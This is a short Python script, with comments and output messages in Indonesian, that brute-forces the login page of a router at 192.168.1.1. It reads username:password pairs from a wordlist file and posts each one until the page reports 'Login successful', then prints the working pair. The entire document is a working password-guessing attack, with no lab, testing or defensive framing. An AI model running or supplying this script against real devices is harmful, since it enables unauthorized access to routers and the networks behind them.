import requests

url = "http://192.168.1.1/html/login.cgi"

# Baca daftar username dan password dari wordlist
with open("wordlist.txt", "r") as file:
    lines = file.readlines()

for line in lines:
    username, password = line.strip().split(":")
    
    data = {
        "username": username,
        "password": password,
    }

    try:
        response = requests.post(url, data=data)
        if "Login successful" in response.text:
            print(f"Login berhasil: {username}:{password}")
            break
        else:
            print(f"Login gagal: {username}:{password}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
